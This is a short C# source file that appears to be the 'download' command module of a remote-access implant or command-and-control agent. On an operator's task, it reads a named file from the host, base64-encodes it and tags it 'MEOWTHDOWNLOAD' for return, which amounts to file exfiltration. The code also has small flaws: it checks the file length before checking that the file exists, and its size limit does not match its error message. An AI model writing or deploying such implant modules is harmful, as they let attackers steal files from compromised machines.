using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Agent.Models;
namespace Agent.Commands
{
    public class Download : AgentCommand
    {
        public override string Name => "download";

        public override string Execute(AgentTask task)
        {
            if (task.Args is null || task.Args.Length == 0)
            {
                return "file path not provided";
            }
            var filePath = task.Args[0];
            var fileInfo = new FileInfo(filePath);
            if (fileInfo.Length > 6000000) return "File size greater than 5mb";
            if (!fileInfo.Exists) return "File doesnt exist.";
            string outString = "MEOWTHDOWNLOAD";
            // this is risky
            try
            {
                byte[] file = File.ReadAllBytes(filePath);
                outString += System.Convert.ToBase64String(file);
                return outString;
            }
            catch
            {
                return "Failed to download file";
            }
        }
    }
}
